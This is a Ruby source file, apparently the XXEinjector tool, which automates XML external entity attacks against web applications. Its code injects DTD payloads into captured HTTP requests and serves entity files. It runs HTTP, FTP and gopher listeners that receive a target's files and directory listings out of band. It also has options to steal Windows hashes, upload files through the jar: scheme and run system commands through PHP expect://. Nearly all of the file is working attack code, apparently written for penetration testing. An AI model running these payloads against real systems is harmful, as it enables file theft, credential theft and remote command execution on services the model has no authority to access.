#!/usr/bin/env ruby

require 'socket'
require 'fileutils'
require 'uri'
require 'net/http'
require 'net/https'
require 'base64'
require 'readline'

# CONFIGURE
host = "" # our external ip
path = "" # path to enumerate
$file = "" # file with vulnerable HTTP request
enum = "ftp" # which out of band protocol should be used for file retrieval - ftp/http

$proto = "http" # protocol to use - http/https
$proxy = "" # proxy host
$proxy_port = "" # proxy port

enumports = "" # which ports should be checked if they are unfiltered for reverse connections
phpfilter = "n" # if yes php filter will be used to base64 encode file content - y/n
$urlencode = "n" # if injected DTD should be URL encoded
enumall = "n" # if yes XXEinjector will not ask what to enum (prone to false positives) - y/n
brute = "" # file with paths to bruteforce
$direct = "" # if direct exploitation should be used, this parameter should contain unique mark between which results are returned

hashes = "n" # steal Windows hashes
upload = "" # upload this file into temp directory using Java jar schema
expect = "" # command that gets executed using PHP expect
$xslt = "n" # tests for XSLT

$dtdi = "y" # if yes then DTD is injected automatically
$verbose = "n" # verbose messaging
timeout = 10 # timeout for receiving responses

http_port = 80 # http port that receives file contents/directory listings and serves XML files
ftp_port = 21 # ftp port that receives file contents/directory listings
gopher_port = 70 # gopher port that receives file contents/directory listings
jar_port = 1337 # port accepts connections and then sends files
xslt_port = 1337 # port that is used to test for XSLT injection

# set all variables
ARGV.each do |arg|
	host = arg.split("=")[1] if arg.include?("--host=")
	path = arg.split("=")[1] if arg.include?("--path=")
	$file = arg.split("=")[1] if arg.include?("--file=")
	enum = arg.split("=")[1] if arg.include?("--oob=")
	$proto = "https" if arg.include?("--ssl")
	$proxy = arg.split("=")[1].split(":")[0] if arg.include?("--proxy=")
	$proxy_port = arg.split("=")[1].split(":")[1] if arg.include?("--proxy=")
	phpfilter = "y" if arg.include?("--phpfilter")
	enumall = "y" if arg.include?("--fast")
	brute = arg.split("=")[1] if arg.include?("--brute=")
	$verbose = "y" if arg.include?("--verbose")
	xslt_port = arg.split("=")[1] if arg.include?("--xsltport=")
	http_port = arg.split("=")[1] if arg.include?("--httpport=")
	ftp_port = arg.split("=")[1] if arg.include?("--ftpport=")
	gopher_port = arg.split("=")[1] if arg.include?("--gopherport=")
	jar_port = arg.split("=")[1] if arg.include?("--jarport=")
	timeout = Integer(arg.split("=")[1]) if arg.include?("--timeout=")
	hashes = "y" if arg.include?("--hashes")
	upload = arg.split("=")[1] if arg.include?("--upload=")
	expect = arg.split("=")[1] if arg.include?("--expect=")
	enumports = arg.split("=")[1] if arg.include?("--enumports=")
	$urlencode = "y" if arg.include?("--urlencode")
	$dtdi = "n" if arg.include?("--nodtd")
	$xslt = "y" if arg.include?("--xslt")
	$direct = arg.split("=")[1] if arg.include?("--direct=")
end

# show DTD to inject
if ARGV.include? "--dtd"
	if host == ""
		host = "YOUR_HOST"
	end
	if http_port == ""
		http_port = "HTTPPORT"
	end
	puts ""
	puts "<!DOCTYPE m [ <!ENTITY % remote SYSTEM \"http://#{host}:#{http_port}/file.dtd\">%remote;%int;%trick;]>"
	puts ""
	exit(1)
end

# show sample direct exploitation XML
if ARGV.include? "--xml"
	puts ""
	puts "<!DOCTYPE m [ <!ENTITY direct SYSTEM \"XXEINJECT\">]><tag>UNIQUEMARK&direct;UNIQUEMARK</tag>"
	puts ""
	exit(1)
end

# show main menu
if ARGV.nil? || ARGV.size < 3 || (host == "" && $direct == "") || $file == "" || (path == "" && brute == "" && hashes == "n" && upload == "" && expect == "" && enumports == "" && $xslt == "n")
	puts "XXEinjector by Jakub Pa\u0142aczy\u0144ski"
	puts ""
	puts "XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications."
	puts ""
	puts "Options:"
	puts "  --host	Mandatory - our IP address for reverse connections. (--host=192.168.0.2)"
	puts "  --file	Mandatory - File containing valid HTTP request with xml. You can also mark with \"XXEINJECT\" a point where DTD should be injected. (--file=/tmp/req.txt)"
	puts "  --path	Mandatory if enumerating directories - Path to enumerate. (--path=/etc)"
	puts "  --brute	Mandatory if bruteforcing files - File with paths to bruteforce. (--brute=/tmp/brute.txt)"
	puts ""
	puts "  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)"
	puts "  --direct		Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --xml to see how XML in request file should look like. (--direct=UNIQUEMARK)"
	puts "  --phpfilter		Use PHP filter to base64 encode target file before sending."
	puts "  --enumports		Enumerating unfiltered ports for reverse connection. Specify value \"all\" to enumerate all TCP ports. (--enumports=21,22,80,443,445)"
	puts ""
	puts "  --hashes	Steals Windows hash of the user that runs an application."
	puts "  --expect	Uses PHP expect extension to execute arbitrary system command. Best works with HTTP and PHP filter. (--expect=ls)"
	puts "  --upload	Uploads specified file using Java jar schema into temp file. (--upload=/tmp/upload.txt)"
	puts "  --xslt	Tests for XSLT injection."
	puts ""
	puts "  --ssl		Use SSL."
	puts "  --proxy	Proxy to use. (--proxy=127.0.0.1:8080)"
	puts "  --httpport	Set custom HTTP port. (--httpport=80)"
	puts "  --ftpport	Set custom FTP port. (--ftpport=21)"
	puts "  --gopherport	Set custom gopher port. (--gopherport=70)"
	puts "  --jarport	Set custom port for uploading files using jar. (--jarport=1337)"
	puts "  --xsltport	Set custom port for XSLT injection test. (--xsltport=1337)"
	puts ""
	puts "  --urlencode	URL encode injected DTD. This is default for URI."
	puts "  --nodtd	If you want to put DTD in request by yourself. Specify \"--dtd\" to show how DTD should look like."
	puts "  --timeout	Timeout for receiving file/directory content. (--timeout=20)"
	puts "  --fast	Skip asking what to enumerate. Prone to false-positives."
	puts "  --verbose	Show verbose messages."
	puts ""
	puts "Example usage:"
	puts "  Enumerating /etc directory in HTTPS application:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl"
	puts "  Enumerating /etc directory using gopher for OOB method:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher"
	puts "  Bruteforcing files using HTTP out of band method:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http"
	puts "  Enumerating using direct exploitation:"
	puts "  ruby #{__FILE__} --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK"
	puts "  Enumerating unfiltered ports:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --enumports=all"
	puts "  Stealing Windows hashes:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --hashes"
	puts "  Uploading files using Java jar:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf"
	puts "  Executing system commands using PHP expect:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls"
	puts "  Testing for XSLT injection:"
	puts "  ruby #{__FILE__} --host=192.168.0.2 --file=/tmp/req.txt --xslt"
	puts ""
	exit(1)
else
	puts "XXEinjector by Jakub Pa\u0142aczy\u0144ski"
	puts ""
end

# EXECUTION

# DTD to inject
$dtd = "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://#{host}:#{http_port}/file.dtd\">%remote;%int;%trick;]>"
# XSL to inject
$xsl = "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:variable name=\"cmd\" select=\"document('http://#{host}:#{xslt_port}/success')\"/><xsl:value-of select=\"$cmd\"/></xsl:template></xsl:stylesheet>"
# holds HTTP responses
$response = ""
# regex to find directory listings
regex = /^[$.\-_~ 0-9A-Za-z]+$/
# array that holds filenames to enumerate
filenames = Array.new
# temp path holders - hold next filenames in different format being enumerated
nextpath = ""
enumpath = ""
$directpath = ""
# array that contains skipped paths
blacklist = Array.new
# other variables
$port = 0 # remote host application port - fill if HTTP/1.0 is used
$remote = "" # remote host URL/IP address - fill if HTTP/1.0 is used
$method = "post" # HTTP method - get/post
cmp = "" # holds user input
switch = 0 # this switch locks enumeration if response is pending
i = 0 # main counter
$time = 1 # HTTP response timeout
if $direct != ""
	$time = 30
end

# Remove first slash if unix-like path specified
cut = 0
if path[0] == "/"
	path[0] = ''
	cut = 1
end

# Remove slash at the end if unix-like path specified
if path[-1] == "/"
	path[-1] = ''
end

# Remove backslash at the end if Windows system
if path[-2..-1] == "\\\\"
	path[-2..-1] = ''
end
if path[-1] == "\\"
	path[-1] = ''
end

### Processing Request File ###

def configreq()

	found = 0 # for detecting injected DTD

	# check HTTP method
	if File.readlines($file)[0].include?("GET ")
		$method = "get"
	end

	# get URI path
	$uri = File.readlines($file)[0].split(" ")[1]
	if $dtdi == "y"
		turi = URI.decode($uri).gsub("+", " ")
		if turi.include?("XXEINJECT")
			if $direct != ""
				$uri = $uri.sub("XXEINJECT", "file:///#{$directpath}")
			elsif $xslt == "n"
				$uri = $uri.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+"))
			else
				$uri = $uri.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
			end
			puts "DTD injected." if $verbose == "y"
			found = found + 1
		elsif turi.include?("<?xml")
			if $xslt == "n"
				$uri = $uri.sub("?>", "?>" + URI.encode($dtd).gsub("%20", "+"))
				$uri = $uri.sub(/(\?%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
				$uri = $uri.sub(/(%3f>)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
				$uri = $uri.sub(/(%3f%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
				puts "DTD injected." if $verbose == "y"
				found = found + 1
			else
				if turi.match(/(\<\?xml)(.*)(&)/i)
					$uri = $uri.sub(/(\<\?xml)(.*)(&)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
					$uri = $uri.sub(/(%3c%3fxml)(.*)(&)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
					$uri = $uri.sub(/(%3c\?xml)(.*)(&)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
					$uri = $uri.sub(/(\<%3fxml)(.*)(&)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
				elsif turi.match(/(\<\?xml)(.*)/i)
					$uri = $uri.sub(/(\<\?xml)(.*)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
					$uri = $uri.sub(/(%3c%3fxml)(.*)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
					$uri = $uri.sub(/(%3c\?xml)(.*)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
					$uri = $uri.sub(/(\<%3fxml)(.*)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
				end
				puts "DTD injected." if $verbose == "y"
				found = found + 1
			end
		end
	end

	# get connection host and port
	i = 1
	loop do
		break if File.readlines($file)[i].chomp.empty?
		if File.readlines($file)[i].include?("Host: ")
			$remote = File.readlines($file)[i].split(" ")[1]
			if $proto == "http"
				$port = 80
			else
				$port = 443
			end
			if $remote.include?(":")
				$port = $remote.split(":")[1]
				$remote = $remote.split(":")[0]
			end
		end
		i = i + 1
	end

	# get headers
	i = 1
	$headers = Hash.new
	loop do
		break if File.readlines($file)[i].chomp.empty?
		if !File.readlines($file)[i].include?("Host: ")
			header = File.readlines($file)[i].chomp
			if $dtdi == "y"
				if header.include?("XXEINJECT")
					if $direct != ""
						header = header.sub("XXEINJECT", "file:///#{$directpath}")
					elsif $urlencode == "y"
						if $xslt == "n"
							header = header.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+").gsub(";", "%3B"))
						else
							header = header.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D").gsub(";", "%3B"))
						end
					else
						if $xslt == "n"
							header = header.sub("XXEINJECT", $dtd)
						else
							header = header.sub("XXEINJECT", $xsl)
						end
					end
					puts "DTD injected." if $verbose == "y"
					found = found + 1
				end
			end
			if header.include?("Accept-Encoding") && $direct != ""
			else
				$headers[header.split(": ")[0]] = header.split(": ")[1]
			end
		end
		i = i + 1
	end

	# get POST body
	i = i + 1
	$post = ""
	postfind = 0
	if $method == "post"
		loop do
			break if File.readlines($file)[i].nil?
			postline = File.readlines($file)[i]
			if $dtdi == "y"
				tline = URI.decode(postline).gsub("+", " ")
				if tline.include?("XXEINJECT") && $xslt == "n"
					if $direct != ""
						postline = postline.sub("XXEINJECT", "file:///#{$directpath}")
					elsif $urlencode == "y"
						if $xslt == "n"
							postline = postline.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+"))
						else
							postline = postline.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
						end
					else
						if $xslt == "n"
							postline = postline.sub("XXEINJECT", $dtd)
						else
							postline = postline.sub("XXEINJECT", $xsl)
						end
					end
					puts "DTD injected." if $verbose == "y"
					found = found + 1
				elsif tline.include?("XXEINJECT") && $xslt == "y"
					postfind = 1
				elsif tline.include?("<?xml") && $xslt == "n"
					if $urlencode == "y"
							postline = postline.sub("?>", "?>" + URI.encode($dtd).gsub("%20", "+"))
							postline = postline.sub(/(\?%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
							postline = postline.sub(/(%3f>)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
							postline = postline.sub(/(%3f%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
					else
							postline = postline.sub("?>", "?>" + $dtd)
							postline = postline.sub(/(\?%3e)/i, '\1' + $dtd)
							postline = postline.sub(/(%3f>)/i, '\1' + $dtd)
							postline = postline.sub(/(%3f%3e)/i, '\1' + $dtd)
					end
					puts "DTD injected." if $verbose == "y"
					found = found + 1
				elsif tline.include?("<?xml") && $xslt == "y"
					postfind = 1
				end
			end
			$post += postline
			i = i + 1
		end
		if postfind == 1
			if $urlencode == "y"
				if $post.match(/(\<\?xml)(.*)(&)/im) || $post.match(/(%3c%3fxml)(.*)(&)/im) || $post.match(/(%3c\?xml)(.*)(&)/im) || $post.match(/(\<%3fxml)(.*)(&)/im)
					$post = $post.sub(/(\<\?xml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
					$post = $post.sub(/(%3c%3fxml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
					$post = $post.sub(/(%3c\?xml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
					$post = $post.sub(/(\<%3fxml)(.*)(&)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
				elsif $post.match(/(\<\?xml)(.*)/im) || $post.match(/(%3c%3fxml)(.*)/im) || $post.match(/(%3c\?xml)(.*)/im) || $post.match(/(\<%3fxml)(.*)/im)
					$post = $post.sub(/(\<\?xml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
					$post = $post.sub(/(%3c%3fxml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
					$post = $post.sub(/(%3c\?xml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
					$post = $post.sub(/(\<%3fxml)(.*)/im, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
				else
					$post = $post.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
				end
				puts "DTD injected." if $verbose == "y"
				found = found + 1
			else
				if $post.match(/(\<\?xml)(.*)(&)/im) || $post.match(/(%3c%3fxml)(.*)(&)/im) || $post.match(/(%3c\?xml)(.*)(&)/im) || $post.match(/(\<%3fxml)(.*)(&)/im)
					$post = $post.sub(/(\<\?xml)(.*)(&)/im, $xsl + "&")
					$post = $post.sub(/(%3c%3fxml)(.*)(&)/im, $xsl + "&")
					$post = $post.sub(/(%3c\?xml)(.*)(&)/im, $xsl + "&")
					$post = $post.sub(/(\<%3fxml)(.*)(&)/im, $xsl + "&")
				elsif $post.match(/(\<\?xml)(.*)/im) || $post.match(/(%3c%3fxml)(.*)/im) || $post.match(/(%3c\?xml)(.*)/im) || $post.match(/(\<%3fxml)(.*)/im)
					$post = $post.sub(/(\<\?xml)(.*)/im, $xsl)
					$post = $post.sub(/(%3c%3fxml)(.*)/im, $xsl)
					$post = $post.sub(/(%3c\?xml)(.*)/im, $xsl)
					$post = $post.sub(/(\<%3fxml)(.*)/im, $xsl)
				else
					$post = $post.sub("XXEINJECT", $xsl.gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
				end
				puts "DTD injected." if $verbose == "y"
				found = found + 1
			end
		end
	end

	# update Content-Length header
	if $method == "post"
		$headers["Content-Length"] = String($post.bytesize)
	end

	# detect injected DTD
	if found == 0 && $dtdi == "y"
		puts "Automatic DTD injection was not successful. Please put \"XXEINJECT\" in request file where DTD should be placed or run XXEinjector with --nodtd if DTD was placed manually."
		exit(1)
	elsif found > 1
		puts "Multiple instances of XML found. It may results in false-positives."
	end

	# set proxy
	if $proxy == ""
		$proxy = nil
		$proxy_port = nil
	end

	# configuring request
	$request = Net::HTTP.new($remote, $port, $proxy, $proxy_port)

	# set HTTPS
	if $proto == "https"
		$request.use_ssl = true
		$request.verify_mode = OpenSSL::SSL::VERIFY_NONE
	end
end

### End of Processing Request File ###

# Sending request
def sendreq()
	
	if $verbose == "y"
		puts "Sending request with malicious XML:"
		if $proto == "http"
			puts "http://#{$remote}:#{$port}#{$uri}"
			puts $headers
			puts "\n"
			puts $post
			puts "\n"
		else
			puts "https://#{$remote}:#{$port}#{$uri}"
			puts $headers
			puts "\n"
			puts $post
			puts "\n"
		end
	else
		puts "Sending request with malicious XML."
	end
	
	$response = ""
	$request.start { |r|
		begin
			status = Timeout::timeout($time) {
    				if $method == "post"
					$response = r.post($uri, $post, $headers) 
				else
					$response = r.get($uri, $headers)
				end
  			}
		rescue Timeout::Error
		end
	}
end

# Starting servers
begin
	if $xslt == "n" && enumports == "" && $direct == ""
		http = TCPServer.new http_port
	end
	if enum == "ftp" && $xslt == "n" && enumports == "" && $direct == ""
		ftp = TCPServer.new ftp_port
	end
	if enum == "gopher" && $xslt == "n" && enumports == "" && $direct == ""
		gopher = TCPServer.new gopher_port
	end
	if upload != ""
		jar = TCPServer.new jar_port
	end
	if $xslt == "y"
		xsltserv = TCPServer.new xslt_port
	end
rescue Errno::EADDRINUSE
	puts "Specified TCP ports already in use."
	exit(1)
end

# HTTP for XML serving and data retrival
Thread.start do
loop do
  Thread.start(http.accept) do |client|
	done = 0
	tmppath = nextpath
	loop {

		params = {}
		req = client.gets()
		break if req.nil?

		# HTTP XML serving
		if req.include? "file.dtd"

			puts "Got request for XML:\n#{req}\n" if $verbose == "y"

			if hashes == "n" && upload == "" && expect == ""
				if cut == 1
					puts "Responding with XML for: /#{enumpath}"
				else
					puts "Responding with XML for: #{enumpath}"
				end
			else
				puts "Responding with proper XML."
			end

			# respond with proper XML
			if hashes == "y"
				payload = "<!ENTITY % payl \"hashes\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'file:////#{host}/hash/hash.txt'>\">"
				client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
			elsif upload != ""
				payload = "<!ENTITY % payl \"upload\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'jar:http://#{host}:#{jar_port}!/upload'>\">"
				client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
			elsif expect != ""
				if enum == "ftp"
					if phpfilter == "n"
						payload = "<!ENTITY % payl SYSTEM \"expect://#{expect}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
						client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
					else
						payload = "<!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=expect://#{expect}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
						client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
					end
				elsif enum == "http"
					if phpfilter == "n"
						payload = "<!ENTITY % payl SYSTEM \"expect://#{expect}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
						client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
					else
						payload = "<!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=expect://#{expect}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
						client.print("HTTP/1.1 200 OK\r\nContent-Type: application/xml\r\nContent-Length: #{payload.bytesize}\r\nConnection: close\r\n\r\n#{payload}")
					end
				end
			elsif enum == "ftp" && expect == ""
				if phpfilter == "n"
					payload = "<!ENTITY % payl SYSTEM \"file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
				else
					payload = "<!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
				end
			elsif enum == "http" && expect == ""
				if phpfilter == "n"
					payload = "<!ENTITY % payl SYSTEM \"file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
				else
					payload = "<!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
				end
			elsif enum == "gopher" && expect == ""
				payload = "<!ENTITY % payl SYSTEM \"file:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'gopher://#{host}:#{gopher_port}/?gopher=%payl;'>\">"
				client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
			end
			puts "XML payload sent:\n#{payload}\n\n" if $verbose == "y"

		end

		# HTTP data retrival
		if req.include? "?p="
			
			switch = 0
			puts "Response with file/directory content received:\n" + req + "\nEnumeration unlocked." if $verbose == "y"
			
			# retrieve p parameter value and respond
			req = req.sub("GET /?p=", "").split(" ")[0]
			client.print("HTTP/1.1 200 OK\r\nContent-Length: 6\r\nConnection: close\r\nContent-Type: plain/text\r\n\r\nThanks")

			# base64 decode if parameter was encoded
			if phpfilter == "y"
				req = Base64.decode64(req)
			end

			# if PHP expect then print and exit
			if expect != ""
				puts "Result of \"#{expect}\" command:\n" + req
				exit(1)
			end

			req.split("%0A").each do |param|

				param = URI.decode(param)

				# log to separate file or brute.log if in bruteforce mode
				if brute == ""
					logpath = "#{path}"
					if tmppath != ""
						if cut == 1
							logpath += "/"
						else
							logpath += "\\"
						end
					end
					logpath += "#{tmppath}"
					logpath = logpath.gsub('\\','/')
					if tmppath != ""
						FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
					else
						if logpath.include?("/")
							FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
						else
							FileUtils.mkdir_p $remote + "/" + logpath
						end
					end
					if  done == 0
						if cut == 1
							puts "Successfully logged file: /#{logpath}"
							done = 1
						else
							puts "Successfully logged file: #{logpath}"
							done = 1
						end
					end
					log = File.open($remote + "/" + "#{logpath}.log", "a")
					log.write param + "\n"
					log.close
				else
					log = File.open("brute.log", "a")
					log.write param + "\n"
					puts "Bruteforced request logged: #{param}" if $verbose == "y"
					log.close
				end	

				# push to array if directory listing is detected for further enumeration
				if brute == ""
					param = param.chomp
					if param.match regex
						logp = tmppath
						if tmppath != ""
							if cut == 1
								logp += "/"
							else
								logp += "\\"
							end
						end
						logp += param
						filenames.push(logp)
						puts "Path pushed to array: #{logp}" if $verbose == "y"
					end
				end
			end
		end
		client.close

	}
  end
end
end

# FTP server to read files/directory listings and log to files
if enum == "ftp"
	Thread.start do
	loop do
  	  Thread.start(ftp.accept) do |client|
		done = 0
		switch = 0
		puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
		tmppath = nextpath
		client.puts("220 XXEinjector Welcomes!")
		loop {
			req = client.gets()
			break if req.nil?	

			# respond with proper option
			if req.include? "LIST"
				client.puts("drwxrwxrwx 1 xxe xxe          1 Jan 01 01:01 xxe")
				client.puts("150 Opening BINARY mode data connection for /xxe")
				client.puts("226 Transfer complete")
			end
			if req.include? "USER"
				client.puts("331 password required")
			end
			if req.include? "PORT"
				client.puts("200 PORT command OK")
			else
				client.puts("230 Now you can send data")
			end
		
			# truncate requests to proper format and base64 decode if encoded
			if req.include? "RETR "
				req = req.split(' ')[1..-1].join(' ')
				req += "\n"
			end

			if phpfilter == "y"
				req = Base64.decode64(req)
			end

			# if PHP expect then print and exit
			if expect != ""
				puts "Result of \"#{expect}\" command:\n" + req
				exit(1)
			end
			
			# log to separate file or brute.log if in bruteforce mode
			if brute == ""
				logpath = ""
				logpath += "#{path}"
				if tmppath != ""
					if cut == 1
						logpath += "/"
					else
						logpath += "\\"
					end
				end
				logpath += "#{tmppath}"
				logpath = logpath.gsub('\\','/')
				if tmppath != ""
					FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
				else
					if logpath.include?("/")
						FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
					else
						FileUtils.mkdir_p $remote + "/" + logpath
					end
				end
				if  done == 0
					if cut == 1
						puts "Successfully logged file: /#{logpath}"
						done = 1
					else
						puts "Successfully logged file: #{logpath}"
						done = 1
					end
				end
				log = File.open($remote + "/" + "#{logpath}.log", "a")
				log.write req
				log.close
			else
				log = File.open("brute.log", "a")
				log.write req
				puts "Bruteforced request logged: #{req}" if $verbose == "y"
				log.close
			end	

			# clear requests that are known to be not part of directory listing
			req = req.chomp
			if req.match(/^USER /)
				req = ""
			end
			if req.match(/^PASS /)
				req = ""
			end
			if req == "TYPE I"
				req = ""
			end
			if req.include? "EPSV"
				req = ""
			end	

			# push to array if directory listing is detected for further enumeration
			if brute == ""
				if req.match regex
					logp = tmppath
					if tmppath != ""
						if cut == 1
							logp += "/"
						else
							logp += "\\"
						end
					end
					logp += req
					filenames.push(logp)
					puts "Path pushed to array: #{logp}" if $verbose == "y"
				end
			end

		}
  	  end
	end
	end
end

# gopher server to read files/directory listings and log to files
if enum == "gopher"
	Thread.start do
	loop do
 	  Thread.start(gopher.accept) do |client|
		done = 0
		switch = 0
		puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
		tmppath = nextpath
		loop {
			req = ""
			loop do
				tmp = client.gets()
				break if tmp.chomp == ""
				req += tmp
			end

			req.sub! 'gopher=', ''
			req.split("\n").each do |param|

				# log to separate file or brute.log if in bruteforce mode
				if brute == ""
					logpath = ""
					logpath += "#{path}"
					if tmppath != ""
						if cut == 1
							logpath += "/"
						else
							logpath += "\\"
						end
					end
					logpath += "#{tmppath}"
					logpath = logpath.gsub('\\','/')
					if tmppath != ""
						FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
					else
						if logpath.include?("/")
							FileUtils.mkdir_p $remote + "/" + logpath.split("/")[0..-2].join('/')
						else
							FileUtils.mkdir_p $remote + "/" + logpath
						end
					end
					if  done == 0
						if cut == 1
							puts "Successfully logged file: /#{logpath}"
							done = 1
						else
							puts "Successfully logged file: #{logpath}"
							done = 1
						end
					end
					log = File.open($remote + "/" + "#{logpath}.log", "a")
					log.write param + "\n"
					log.close
				else
					log = File.open("brute.log", "a")
					log.write param + "\n"
					puts "Bruteforced request logged: #{param}" if $verbose == "y"
					log.close
				end
		
				# push to array if directory listing is detected for further enumeration
				if brute == ""
					if param.match regex
						logp = tmppath
						if tmppath != ""
							if cut == 1
								logp += "/"
							else
								logp += "\\"
							end
						end
							logp += param
						filenames.push(logp)
						puts "Path pushed to array: #{logp}" if $verbose == "y"
					end
				end
			end

		}
  	  end
	end
	end
end

